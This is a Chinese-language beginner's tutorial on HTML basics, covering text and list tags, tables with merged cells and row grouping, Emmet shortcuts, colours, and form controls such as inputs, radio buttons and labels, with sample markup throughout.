HTML元素（Element） Element 元素的结构由 开始标签+内容+结束标签 组成，一个完整的元素都是由开始标签和结束标签成对出现，结束标签多了一个斜杠 在 HTML5 中 没有内容时就可以使用自闭标签 比如 &lt;tagname/&gt; 或者 &lt;tagname&gt;（HTML5 中支持这种自闭合的写法） 默认的自闭合标签 &lt;br&gt; &lt;hr&gt; &lt;input&gt; ... HTML 标签还有属性，属性的规则为 属性名=\"属性值\" HTML 元素分为块状元素 和 行内元素 块状元素的宽度是 100% 独占一行 行内元素不会独占一行（最简单的方法就是加个 &lt;br&gt; 标签换行） 更多元素和属性查看 mozilla 示例 H1 H2 是块状元素独占一行 行内元素最简单的方式通过 br 标签换行 img 标签可以设置宽度和 alt 属性 img 标签也是行内元素 src 设置图片路径可以是本地文件(./ 表示当前路径)，也可以是 http 路径 a 标签是超链接标签 也是一个行内元素 加上 target 属性 view_window 或者 _blank 在新窗口打开超链接 &lt;!DOCTYPE html&gt; &lt;!--suppress HtmlUnknownTarget --&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;这是一个 H1 标签&lt;/h1&gt; &lt;h2&gt;这是一个 H2 标签&lt;/h2&gt; &lt;img src=\"./00.png\" alt=\"当图片不存在时显示这里的内容\"&gt; &lt;img src=\"./image-20220512165150400.png\" alt=\"当图片不存在时显示这里的内容\" width=\"400px\"&gt; &lt;br&gt; &lt;a href=\"www.adalucky.com\" target=\"view_window\"&gt;个人博客&lt;/a&gt; &lt;a href=\"www.adalucky.com\" target=\"_blank\"&gt;个人博客&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; 标签属性 title 属性，鼠标移动到标签上，会显示 title 的属性值，类似于 hover 做一些说明，title属性不占据页面内容，当鼠标滑动停留时显示 aling=\"center\" 水平居中 ，比如标题标签居中显示 img 下的 alt 属性，图片加载失败或者破图可以作为一个提示让用户也知道这是一张表达什么作用内容的图片，alt 会占据内容，只有当图片加载不了才会显示 超链接标签 a 标签下的 target 属性可决定超链接在当前窗口还是新窗口打开，不定义默认是当前窗口 target=\"_self\" 当前页面 target=\"_blank\" 新窗口 锚点又叫做命名标记，就像一个迅速定位器，比如手机通讯录或者微信右侧的字母，可以通过首字母快速定位到某一姓名首字母相同的人，可以实现在页面内进行跳转，目的地标签上加上 id 属性，然后再 a 标签的 href属性通过 #id的属性名进行绑定，例如 &lt;a href=\"#P2\"&gt;CSS&lt;/a&gt; 文本标签 文本通过通过 &lt;b&gt;需要加粗的文本&lt;/b&gt; &lt;strong&gt;需要加粗且重要的文本&lt;/strong&gt; 这两者进行文本加粗，区别在于 b 标签只是加粗，strong 标签语义化更强，表示该文本比较重要，提醒阅读者注意，盲人朋友使用阅读设备时会加重该标签内的读音 文本倾斜通过 i（italic 斜体的） 或者 em (emphasize 强调) 标签来实现，&lt;i&gt;待修饰倾斜的文本&lt;/i&gt; &lt;em&gt;待修饰倾斜的文本&lt;/em&gt;,i标签仅仅为了让字体显示倾斜，没有强调的语义，em标签不仅能让字体显示倾斜，还可以加强语气，还可以让百度等搜素引擎爬取我们的页面时特别收录 em 中的文本,以便于别人从百度中搜索 em 中的关键字时，让我们的页面优先曝光 删除线可用 s(strike 取消 删除) 或者 del(delete 删除 划掉) 如 删除线 &lt;s&gt;删除线文本&lt;/s&gt; &lt;del&gt;删除线文本&lt;/del&gt; html5 已经不支持 s 标签了，所以用 del 吧 文本添加下划线通过 u（underline 下划线）标签实现,例如 待修饰下划线的文本 &lt;u&gt;待修饰下划线的文本&lt;/u&gt; 角标分为 sup(superscript 上角标) sub(subscript 下角标) 示例：41oC H2O15 列表标签简介 列表分为三类：有序、无序、自定义 有序列表 有序列表由两个元素组成 ol（order list 有序列表）和 li（list item 列表） 二者是父子关系 遵循 W3C 的规范,ol 标签下只能嵌套 li 标签,如果要嵌套其它标签，也只能放在 li 标签里面 列表前面的序号被称为项目符号,有序列表的序号默认从自然数 1 开始 W3C 为了兼顾多语种的需求,规定了项目符号是可以通过 type属性 设置,type 的取值范围【A,a,I,i,1】分别表示大小写字母顺序,大小写罗马数字顺序，阿拉伯数字顺序 有序列表不光能更换项目符号，还能更换起始序号可以通过 start属性 设置 无序列表 无序列表：指列表中的内容是没有时间、空间或者逻辑等顺序要求的 如下方图片所示，每个人对事情的处理先后顺序标准都不一样，对于这种无顺序的内容就可以用无序列表来展示了 有序列表由两个元素组成 ul（unorder list 无序列表）和 li（list item 列表） 二者是父子关系 和有序列表一样 ul 标签下只能嵌套 li 标签,如果要嵌套其它标签，也只能放在 li 标签里面 无序列表的默认项目符号是一个实心的圆点例如这样 –&gt; ● 但是我们也可以通过 type属性 设置,type 的取值范围【disc,circle,square,none】分别表示【实心圆,空心圆,隐藏项目符号,实心方块】 自定义列表 自定义列表一般在网页的底部用的比较多，比如下图中的【帮助中学、服务支持等】 自定义列表由三个标签组成 dl dt dd 分别表示定义列表、定义术语（列表标题）、定义描述（列表内容） 注意：dt 和 dd 是 dl 的子标签 dt 和 dd 是兄弟标签 dd 和 dt 不能脱离 dl 单独使用 以下是一个简单的自定义列表的示例，如果要达到上面 little mi 的那种效果，后期可通过学习 css 进行完善 列表综合案例 &amp;emsp; 表示中文位置大小的空格 &amp;nbsp; 表示一个空格大小 img 标签中直接添加 align=\"center\" 属性并不能居中,因此 img 需要放在 p 标签中 自定义列表中的标题 dl 中不光是只用来放文本,也可以放图片,根据实际需求而定 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;综合案例&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 align=\"center\"&gt;综合案例&lt;/h1&gt; &lt;p&gt; &amp;emsp;&amp;emsp;万里长城，龙脉绵延，是中华民族的骄傲，无论是“望长城内外惟余莽莽”的诗句，还是“万里长城永不倒”的歌谣，或是“巨龙横卧轮廓巍峨”的诗歌，无不展现着长城在中国人心中的分量。其实长城也是画家笔下永久的绘画题材，中国画中的国画长城有着很深的内在含义和许多美好的寓意，所以中国人喜欢画长城景色而后挂于厅堂，不但求吉祈福，还承载着中华悠悠历史和美好希冀以及勇敢无畏的中华魂。 &lt;/p&gt; &lt;p&gt; &amp;emsp;&amp;emsp;那么长城景色真的好入画吗?的确，若不是有实力的画家，真的无法将长城的雄风恢弘绘就而出。而当代山水画家王宁恰恰就做到了这一点，他用拙朴的笔法，表现出长城的沧桑与中华民族屹立东方的精神气质。他的国画长城作品粗放又不失秀逸，长城的雄风、恢弘大气之感油然而出。 &lt;/p&gt; &lt;p align=\"center\"&gt; &lt;img src=\"./img.png\" alt=\"万里山河图片\" width=\"400px\"&gt; &lt;/p&gt; &lt;h1&gt;费曼学习法&lt;/h1&gt; &lt;ol&gt; &lt;li&gt;&lt;a href=\"\"&gt;将所学内容,迅速记录到一张纸上&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;练习教授别人&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;查漏补缺,找到不足之处&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;优化及完善&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;h1&gt;小段子&lt;/h1&gt; &lt;ul type=\"square\"&gt; &lt;li&gt;北冥有鱼,其名为鲲&lt;/li&gt; &lt;li&gt;鲲之大,一锅炖不下&lt;/li&gt; &lt;li&gt;化而为鸟,其名为鹏&lt;/li&gt; &lt;li&gt;鹏之大,需要两个烧烤架&lt;/li&gt; &lt;li&gt;一个秘制,一个麻辣&lt;/li&gt; &lt;li&gt;来瓶雪花,带你勇闯天涯&lt;/li&gt; &lt;/ul&gt; &lt;div&gt; &lt;h1&gt;图文混排&lt;/h1&gt; &lt;df&gt; &lt;dl&gt;&lt;img src=\"./img_1.png\" alt=\"我和我的祖国海报\" width=\"400px\"&gt;&lt;/dl&gt; &lt;dd&gt;电影名称: 《我和我的祖国》&lt;/dd&gt; &lt;dd&gt;主演: 黄渤,张译,葛优等&lt;/dd&gt; &lt;dd&gt;导演: 陈凯歌,张一白,徐峥等&lt;/dd&gt; &lt;dd&gt;类型: 剧情&lt;/dd&gt; &lt;/df&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 表格简介 在实际的工作中表格被大量广泛的使用,作为列表数据的展示 表格中中的元素分为: 行,列,单元格 表格用 table 标签定义,tr 和 td 标签分别表示行和列 一个普通的表格每个 tr 中的 td 个数是一致的 初体验 创建一个 4 行(tr) 5列(td)的表格,描述王者荣耀的英雄信息 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;example for table&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;b&gt;序号&lt;/b&gt;&lt;/td&gt; &lt;td&gt;&lt;b&gt;王者英雄&lt;/b&gt;&lt;/td&gt; &lt;td&gt;&lt;b&gt;王者性别&lt;/b&gt;&lt;/td&gt; &lt;td&gt;&lt;b&gt;所属位置&lt;/b&gt;&lt;/td&gt; &lt;td&gt;&lt;b&gt;详情&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;王昭君&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;中路&lt;/td&gt; &lt;td&gt;&lt;a href=\"\"&gt;点击查看详情&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;亚瑟&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;中抗路&lt;/td&gt; &lt;td&gt;&lt;a href=\"\"&gt;点击查看详情&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;虞姬&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;发育路&lt;/td&gt; &lt;td&gt;&lt;a href=\"\"&gt;点击查看详情&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 表头加粗 在一般的使用中我们可能会希望给表头的文本进行一些加粗显示,上面的粗体验采用额通过 b标签 来实现,在 table 中有一个专门用来定义表头的 th 标签 th(table header cell 表头单元格),该标签下的文本会加粗并且居中显示 和上面相比我们把 &lt;td&gt;&lt;b&gt;序号&lt;/b&gt;&lt;/td&gt; 换成了 &lt;th&gt;序号&lt;/th&gt; 同样实现了加粗效果并且居中显示 &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;王者英雄&lt;/th&gt; &lt;th&gt;王者性别&lt;/th&gt; &lt;th&gt;所属位置&lt;/th&gt; &lt;th&gt;详情&lt;/th&gt; &lt;/tr&gt; 表格边框 上面的图片并没有边框线给每个单元格进行划分开,可以再 table 上添加 border 属性 进行指定边框大小 示例: &lt;table border=\"1\"&gt; (目前这种方式表格边框的线是双边框线.下方的单元格间距将会描述) 表格宽高 通过 width 和 height 控制表格总体的宽高 示例: &lt;table width=\"500px\" height=\"150px\"&gt;&lt;/table&gt; 不难发现,它视乎会根据我们单元格内文本的宽度去分配列宽 单元格间距cellspacing 上面的表格边框章节我们可以看到单元格与单元格之间的线是两条线,究其缘由是因为单元格与单元格之间的间隙过大导致生成的 我们只需要通过 cellspacing 属性进行控制即可 示例: &lt;table cellspacing=\"0\"&gt;&lt;/table&gt; 如果需要让单元格间距变大,增加 cellspacing 属性值即可 单元格文本间距cellpadding cellpadding 可控制单元格与文本之间的距离,假设我们想要文本居左靠齐 我们只需要通过 cellpadding 属性进行控制即可 示例: &lt;table cellpadding=\"0\"&gt;&lt;/table&gt; 如果需要让文本与单元格间距变大,增加 cellpadding 属性值即可 表格页面布局 这里指的是表格再页面上整体的位置，并不是指的单元格里面文本的对其方式 可以通过 align 属性控制,取值范围有【left、center、right】 表格和边框颜色 就像 Excel 中我们可以给单元格设置背景色填充，或者边框线的颜色 table 标签中通过 bgcolor bordercolor 两个属性实现单元格和框线的颜色填充 示例: &lt;table bgcolor=\"yellow\" bordercolor=\"red\"&gt;&lt;/table&gt; （表格黄色背景，红色边框） 单元行 tr 属性 height(单元行高度)、bgcolor(单元行背景颜色)、align(水平对其方式)、valign(垂直对其方式) 设置单元行的高度: height 属性设置当前行的高度,如果 table 设置了高度,我们给其中一个单元行设置了固定高度后，剩下的单元行会平分剩余高度 例如: 当前一个 4 行高的表格总体高度 300px 给第一行设置高度 150px,那么剩余 3 行平均每行 50px 设置单元行背景颜色遵循就近原则 可以给单元行设置文本对其方式,默认为水平居左，垂直居中 单元格 设置某一单元格的列宽(width),会影响所在列的列宽 设置某一单元格的行高(height),会影响所在行的行高 设置某一单元格的背景色(bgcolor),不会影响其它单元格 和单元行一样也可通过 align(水平对其方式)、valign(垂直对其方式) 两个属性设置当前所在的单元格的文本对其方式，默认水平居左，垂直居中 合并单元格 单元格的合并，脑海中回想一下 Excel 的合并，单元格和其一样，分为水平合并(横向合并)、垂直合并(纵向合并) 水平合并产生跨列从哪一列合并到哪一列，垂直合并产生跨行从哪一行合并到哪一行 单元格的垂直合并，就是列合并,需要从起始列的下一列开始,减少列数一直到终止列，然后在起始类通过 rowspan 跨行指定合并的个数 跨列合并也是一样，删除需要合并的单元格，然后在起始的单元格通过 colspan(column span) 跨列指定合并的个数 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;example to cell merger&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=\"1\" cellspacing=\"0\" width=\"500\" height=\"500\"&gt; &lt;tr bgcolor=\"deepskyblue\" height=\"30\"&gt; &lt;th&gt;&lt;/th&gt; &lt;th&gt;星期一&lt;/th&gt; &lt;th&gt;星期二&lt;/th&gt; &lt;th&gt;星期三&lt;/th&gt; &lt;th&gt;星期四&lt;/th&gt; &lt;th&gt;星期五&lt;/th&gt; &lt;/tr&gt; &lt;tr bgcolor=\"skyblue\" height=\"30\"&gt; &lt;td&gt;早自习&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td bgcolor=\"skyblue\" rowspan=\"4\"&gt;上午&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr bgcolor=\"skyblue\"&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr bgcolor=\"skyblue\"&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td bgcolor=\"skyblue\" rowspan=\"4\"&gt;下午&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr bgcolor=\"skyblue\"&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr bgcolor=\"skyblue\"&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr height=\"30\"&gt; &lt;td bgcolor=\"skyblue\"&gt;晚自习&lt;/td&gt; &lt;td colspan=\"5\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 表格分组 caption标题标签、thead表头(table head )、tbody表体(table body)、tfoot表尾(table foot) 这些都是属于行分组 colgroup 列分组标签,和 caption 同级语法示例: &lt;colgroup span=\"1\" bgcolor=\"skyblue\"&gt;&lt;/colgroup&gt; 一般用于设置某一列的颜色或者字体等样式,这里的 1 表示第一列,如果要进行第二列分组的话就再创建一个 colgroup 标签 span 的值还是 1,表示第二列分组也只有一列，如果第二列分组有 6 列 那么 span 的值就是 6 表格中如果没有使用分组标签,浏览器在渲染时默认会把 tr 放在 tbody,为了使语义化更强，我们可以根据实际情况手动进行分组添加对应的分组标签 W3C 的标准约定,一个 table 下只允许使用一个 thead 和一个 tfoot ,允许使用多个 tbody 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=\"1\" width=\"500\" height=\"500\" align=\"center\" bordercolor=\"#ffffff\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;caption&gt;阿里职级薪资&lt;/caption&gt; &lt;colgroup span=\"1\" bgcolor=\"skyblue\"&gt;&lt;/colgroup&gt; &lt;colgroup span=\"6\" bgcolor=\"orange\"&gt;&lt;/colgroup&gt; &lt;thead bgcolor=\"deepskyblue\"&gt; &lt;tr&gt; &lt;th rowspan=\"2\"&gt;序号&lt;/th&gt; &lt;th colspan=\"6\"&gt;技术岗与管理岗职级薪资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;P序列&lt;/th&gt; &lt;th&gt;P级名称&lt;/th&gt; &lt;th&gt;M序列&lt;/th&gt; &lt;th&gt;M级名称&lt;/th&gt; &lt;th&gt;薪资&lt;/th&gt; &lt;th&gt;股票&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody align=\"center\"&gt; &lt;tr&gt; &lt;th&gt;1&lt;/th&gt; &lt;td&gt;P6&lt;/td&gt; &lt;td&gt;资深工程师&lt;/td&gt; &lt;td&gt;M1&lt;/td&gt; &lt;td&gt;主管&lt;/td&gt; &lt;td&gt;20W-35W&lt;/td&gt; &lt;td&gt;几乎不授予&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;2&lt;/th&gt; &lt;td&gt;P7&lt;/td&gt; &lt;td&gt;技术专家&lt;/td&gt; &lt;td&gt;M2&lt;/td&gt; &lt;td&gt;经理&lt;/td&gt; &lt;td&gt;30W-50W&lt;/td&gt; &lt;td&gt;2400股&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;3&lt;/th&gt; &lt;td&gt;P8&lt;/td&gt; &lt;td&gt;高级专家&lt;/td&gt; &lt;td&gt;M3&lt;/td&gt; &lt;td&gt;高级经理&lt;/td&gt; &lt;td&gt;45W-80W&lt;/td&gt; &lt;td&gt;6400股&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;4&lt;/th&gt; &lt;td&gt;P9&lt;/td&gt; &lt;td&gt;资深专家&lt;/td&gt; &lt;td&gt;M4&lt;/td&gt; &lt;td&gt;总监&lt;/td&gt; &lt;td&gt;80W-100W&lt;/td&gt; &lt;td&gt;16000股&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;5&lt;/th&gt; &lt;td&gt;P10&lt;/td&gt; &lt;td&gt;研究员&lt;/td&gt; &lt;td&gt;M5&lt;/td&gt; &lt;td&gt;高级总监&lt;/td&gt; &lt;td&gt;150W&lt;sup&gt;+&lt;/sup&gt;&lt;/td&gt; &lt;td&gt;20000股&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;tr bgcolor=\"#D7E1C5\"&gt; &lt;th bgcolor=\"#B0CC7F\"&gt;说明&lt;/th&gt; &lt;td colspan=\"6\"&gt;P-Profession M-Manage,马云在阿里的级别是M10&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; Emmet简介 Emmet 并不是什么 html 中的知识，而是一种提高开发效率的 语法,其语法简单，使用方便，能提高我们编写 html 代码的速度 VS Code 内置了 Emmet 的语法,开箱即用,（我用的 IDEA ） 快速创建一个空标签 快速创建一个标签至需要输入标签名然后按 Tab 键即可 语法: h1 + Tab键,即可生成 &lt;h1&gt;&lt;/h1&gt; 创建一个带 Content 的标签 快速创建一个带有内容的标签,比如 h1创建时直接把内容带上 语法: h1{这是一个 H1 标题} + Tab 键,即可生成 &lt;h1&gt;这是一个 H1 标题&lt;/h1&gt; 创建多个带 Content 的标签 如上所示我们已经能快速创建一个带内容的 h1 标签了,那如果我们要创建 5 个 10个内 语法: h1{标签内容}*标签重复次数 + Tab 键 例如 h1{标签内容}*3 + Tab 键 即可生成如下代码 &lt;h1&gt;标签内容&lt;/h1&gt; &lt;h1&gt;标签内容&lt;/h1&gt; &lt;h1&gt;标签内容&lt;/h1&gt; 创建 h1到h6 标签 需求: 快速创建一个 h1到h6 6个标签,每个标签中的文本带有当前序号 语法: h${这是一个$级标签}*6 + Tab 键,即可生成下方代码 说明: 这里的 $ 符号实现一次递增的序号 &lt;h1&gt;这是一个1级标签&lt;/h1&gt; &lt;h2&gt;这是一个2级标签&lt;/h2&gt; &lt;h3&gt;这是一个3级标签&lt;/h3&gt; &lt;h4&gt;这是一个4级标签&lt;/h4&gt; &lt;h5&gt;这是一个5级标签&lt;/h5&gt; &lt;h6&gt;这是一个6级标签&lt;/h6&gt; 嵌套标签 需求: 快速创建一个 ul 其中有 5 个 li 标签 语法: 父标签名&gt;子标签名{子标签内容}*子标签重复次数 + Tab 键,例如 ul&gt;li{这是第$个无序列表}*5 即可生成下方代码 &lt;ul&gt; &lt;li&gt;这是第1个无序列表&lt;/li&gt; &lt;li&gt;这是第2个无序列表&lt;/li&gt; &lt;li&gt;这是第3个无序列表&lt;/li&gt; &lt;li&gt;这是第4个无序列表&lt;/li&gt; &lt;li&gt;这是第5个无序列表&lt;/li&gt; &lt;/ul&gt; 重复嵌套 上面是生成了一个 ul 标签,里面有 5 个 li 标签,如果想生成 2 个 ul 标签,每个 ul 中含有 3 个 li 语法: 父级标签*父级标签重复次数&gt;子级标签{子级标签内容}*子级标签重复次数 + Tab 键,例如 ul*2&gt;li{这是第$个无序列表}*2 即可生成下方代码 &lt;ul&gt; &lt;li&gt;这是第1个无序列表&lt;/li&gt; &lt;li&gt;这是第2个无序列表&lt;/li&gt; &lt;/ul&gt; &lt;ul&gt; &lt;li&gt;这是第1个无序列表&lt;/li&gt; &lt;li&gt;这是第2个无序列表&lt;/li&gt; &lt;/ul&gt; 带属性的标签 需求: 快速创建一个 h1 标签，通过属性让其居中 语法: 标签名[属性名=\"属性值\"] + Tab 键,例如 h1[align=\"center\"]{综合案例} + Tab 键 即可生成下方代码 &lt;h1 align=\"center\"&gt;综合案例&lt;/h1&gt; 其它 生成兄弟元素:p+div 生成多个兄弟元素: (a[target=\"iframeExample\"]+b)*3 生成 3 组 a b 标签 生成分组: (a[target=\"iframeExample\"]&gt;b)*3 颜色 在网页中的颜色由三色光组成：红、绿、蓝 表示颜色的方式有三种 颜色名称(Red、Green、Blue 等，共计 140 个标准的英文名称) 十六进制值,是指使用 #RRGGBB 的形式来定义颜色值，取值在 00-FF 之间 RR(红色强度)、GG(绿色强度)、BB(蓝色强度) 注意 # 号不要丢掉,字母采用小写规范 RGB值,使用 RGB(red,green,blue)，每个参数的取值范围都是 0-255 之间的整数,有时候可能还会看到四个参数的，第四个参数表示强度 0-1 之间的值 例如 rgb(255, 255, 255, 0.1); 长度单位 在网页中长度单位分为：绝对长度单位、相对长度单位，例如 PX % 百分比是相对父元素的像素 元素分类 元素分为：块元素也叫块状元素(block-level 块)、行内元素也叫内联元素(inline 内联) 块级元素总是从新行开始，浏览器会自动在元素的前后添加一些上下边距，块元素独占一行 行内元素不会独占一行,而且只占据必要的宽度，注意行内元素中是不能包含块元素的 表单控件初识表单 页面中填写的信息就像大海里的小鱼小虾，然后用表单就像渔网一样收集起来，然后提交到服务器进行操作或存储 表单通过 form 来进行定义 表单 form 可通过 action 定义提交的接口 method 定义请求方法默认是 get 示例：method=\"POST\" method=\"GET\" 输入框 文本输入框 &lt;input type=\"text\"&gt; 密码输入框 &lt;input type=\"password\"&gt; 输入的密码会被屏蔽,用 * 号显示 name 属性可以绑定输入框的参数名,例如 用户名: &lt;input name=\"username\" type=\"text\"&gt; `` input 是个单标签，自带闭合 总结：input 输入框数据采集的方式由 type 属性决定的,如果没有定义 type 的属性值默认就是文本输入框 &lt;form action=\"\"&gt; 请输入用户名: &lt;input type=\"text\"&gt; &lt;br&gt; 请输入密码: &lt;input type=\"password\"&gt; &lt;/form&gt; 多行文本框 多行文本框可以显示多行输入的文本 &lt;textarea&gt;请输入详细地址&lt;/textarea &gt; 当输入的文本到达多行文本的右侧时,会自动换行 可通过属性 rows cols 设置文本框可见行、列（宽高） &lt;form&gt; 居住地址:&lt;textarea cols=\"30\" rows=\"10\"&gt;请输入你的详情地址&lt;/textarea&gt; &lt;/form&gt; 单选框 定义单选框: &lt;input type=\"radio\" name=\"gander\" value=\"1\"&gt;男 &lt;input type=\"radio\" name=\"gander\" value=\"0\"&gt;女 单选框控件必须成组使用才有意义，每组至少需要两个单选框 组是通过 name 属性来建立的,凡是 name 值相同的就是一组,value 作为接口提交的参数值 同组的单选框只有一个会处在选中状态，其它的会自动呈现未选中状态 如果没有给单选框设置 name 属性,那么每个单选框自成一组 如果一旦选择了某一个单选框,那么就无法通过点击取消选择状态 默认选中通过定义 checked 属性，可指定一个任意的值或者不指定 &lt;form&gt; 请选择性别: &lt;input type=\"radio\" name=\"radio\" value=\"1\"&gt;男 &lt;input type=\"radio\" name=\"radio\" value=\"0\"&gt;女 &lt;/form&gt; 多选框 定义多选框: &lt;input type=\"checkbox\" checked&gt;HTML 默认选中通过定义 checked 属性，可指定一个任意的值或者不指定 &lt;form&gt; 请选择性别: &lt;input type=\"radio\" name=\"radio\" value=\"1\"&gt;男 &lt;input type=\"radio\" name=\"radio\" value=\"0\"&gt;女 &lt;input type=\"radio\" name=\"radio\" value=\"2\" checked&gt;保密 &lt;br&gt; 前端基础包括 &lt;input type=\"checkbox\" checked&gt;HTML &lt;input type=\"checkbox\"&gt;CSS &lt;input type=\"checkbox\"&gt;JavaScript &lt;/form&gt; 单选下拉菜单 当用户点击选择框的时候会出现一个下拉列表,用户可以从列表中选择一个选项我们称这个控件为下拉菜单 下来菜通过 select 标签定义下拉菜单, option 标签定义下拉菜单的列表 select 下只能定义 option 标签 下拉菜单中的默认展示为第一个 option 标签中的值,可以通过 selected 属性 标记为默认选中 多选下拉菜单 和普通的单选下拉菜单一样通过 select 标签定义,设置属性 multiple 表示为一个多选菜单（一般需要按住 shift 进行） 额外可以设置 size=\"number\" 来控制多选菜单的可视高度 文件选择 文件选择也是通过 input 标签,只需要把 type 指定为 file 即可 定于语句: &lt;input type=\"file\"&gt; 在不同浏览器渲染的效果不太一样,不过功能都是一样的 label标签 需求: 如上面的性别单选,我们需要点击对应的小圆点才能选中，如何实现点击文本【男、女、保密】文本也能进行选择对应的单选按钮内 在实际的工作中我们为了提升用户的体验度可能需要使用 label 标签来完成 label 标签对屏幕阅读器用户很有用，因为当用户关注输入元素时,屏幕阅读器会大声读出标签 label 标签要定义 for 属性指定元素的 id 进行关联(元素的 id 要确保唯一性) &lt;form action=\"\"&gt; &lt;label for=\"username\"&gt;请输入用户名:&lt;/label&gt;&lt;input type=\"text\" id=\"username\"&gt; &lt;br&gt; &lt;input type=\"radio\" id=\"man\" name=\"Gender\"&gt;&lt;label for=\"man\"&gt;男&lt;/label&gt; &lt;input type=\"radio\" id=\"woman\" name=\"Gender\"&gt;&lt;label for=\"woman\"&gt;女&lt;/label&gt; &lt;input type=\"radio\" id=\"other\" name=\"Gender\"&gt;&lt;label for=\"other\"&gt;保密&lt;/label&gt; &lt;/form&gt; 默认值&amp;只读&amp;禁用 需求: 在某些情况下页面的一些输入我们需要让他作为只读，比如用户信息中的登录账号，注册后就不能去修改了，还有我们期望某些表单空间在发起请求时，忽略某个控件，可以进行禁用 只读 readonly 属性,一般用作文本输入框 禁用 disabled 属性,可作用于表单内的所有控件 input 输入框的默认值用 value 属性指定 &lt;form&gt; &lt;input type=\"radio\" name=\"Gender\"&gt;男 &lt;input type=\"radio\" name=\"Gender\"&gt;女 &lt;input type=\"radio\" name=\"Gender\" disabled&gt;保密 &lt;br&gt; &lt;span&gt;手机号:&lt;/span&gt; &lt;input value=\"150****1369\" readonly&gt; &lt;br&gt; &lt;br&gt; &lt;span&gt;地址:&lt;/span&gt; &lt;textarea&gt;请输入地址&lt;/textarea&gt; 